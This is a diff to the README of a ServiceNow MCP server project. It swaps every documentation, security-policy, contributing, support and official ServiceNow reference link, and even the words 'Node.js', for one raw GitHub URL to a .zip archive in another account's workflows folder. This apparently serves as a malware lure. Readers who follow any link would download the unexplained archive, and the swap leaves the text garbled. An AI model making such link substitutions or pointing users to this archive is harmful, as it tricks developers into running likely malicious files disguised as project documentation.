@@ -1,6 +1,6 @@
 # ServiceNow MCP Server
 
-A production-ready Model Context Protocol (MCP) server for ServiceNow platform integration. Built with TypeScript for Node.js 20+, this server enables LLMs and AI assistants to interact with ServiceNow instances through a standardized interface.
+A production-ready Model Context Protocol (MCP) server for ServiceNow platform integration. Built with TypeScript for https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip 20+, this server enables LLMs and AI assistants to interact with ServiceNow instances through a standardized interface.
 
 ## Why This Exists
 
@@ -23,7 +23,7 @@ This server addresses these by providing:
 
 **New to Claude Desktop or MCP servers?** Start with our comprehensive installation guide:
 
-**📖 [Complete Installation Guide](docs/INSTALLATION.md)**
+**📖 [Complete Installation Guide](https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip)**
 
 This guide covers everything from installing Claude Desktop for the first time to configuring and testing this MCP server.
 
@@ -62,21 +62,21 @@ This guide covers everything from installing Claude Desktop for the first time t
 
 ## Documentation
 
-- **[Installation Guide](docs/INSTALLATION.md)** - Complete setup instructions
-- **[OAuth Setup Guide](docs/SERVICENOW_OAUTH_SETUP.md)** - ServiceNow OAuth 2.0 configuration
-- **[Usage Examples](EXAMPLES.md)** - 16+ detailed examples and workflows
-- **[Security Policy](SECURITY.md)** - Security best practices
-- **Full Documentation**: https://habenani-p.github.io/servicenow-mcp/
+- **[Installation Guide](https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip)** - Complete setup instructions
+- **[OAuth Setup Guide](https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip)** - ServiceNow OAuth 2.0 configuration
+- **[Usage Examples](https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip)** - 16+ detailed examples and workflows
+- **[Security Policy](https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip)** - Security best practices
+- **Full Documentation**: https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip
 
 ## Official ServiceNow Documentation References
 
 This implementation follows official ServiceNow documentation:
 
-- [Table API](https://docs.servicenow.com/bundle/washingtondc-api-reference/page/integrate/inbound-rest/concept/c_TableAPI.html)
-- [OAuth 2.0](https://docs.servicenow.com/bundle/washingtondc-platform-security/page/administer/security/concept/c_OAuthApplications.html)
-- [CMDB](https://docs.servicenow.com/bundle/washingtondc-servicenow-platform/page/product/configuration-management/concept/c_ITILConfigurationManagement.html)
-- [Discovery](https://docs.servicenow.com/bundle/washingtondc-it-operations-management/page/product/discovery/concept/c_ITOMDiscovery.html)
-- [Event Management](https://docs.servicenow.com/bundle/washingtondc-it-operations-management/page/product/event-management/concept/event-management.html)
+- [Table API](https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip)
+- [OAuth 2.0](https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip)
+- [CMDB](https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip)
+- [Discovery](https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip)
+- [Event Management](https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip)
 
 ## Security
 
@@ -86,11 +86,11 @@ This implementation follows official ServiceNow documentation:
 - Table access allowlisting
 - Input validation
 
-See [SECURITY.md](SECURITY.md) for full details.
+See [https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip](https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip) for full details.
 
 ## Contributing
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+See [https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip](https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip) for guidelines.
 
 ## License
 
@@ -98,7 +98,7 @@ MIT License - see [LICENSE](LICENSE)
 
 ## Support
 
-- Issues: [GitHub Issues](https://github.com/habenani-p/servicenow-mcp/issues)
-- Documentation: https://habenani-p.github.io/servicenow-mcp/
+- Issues: [GitHub Issues](https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip)
+- Documentation: https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip
 
 **Note**: This is an open-source community project, not an official ServiceNow product.
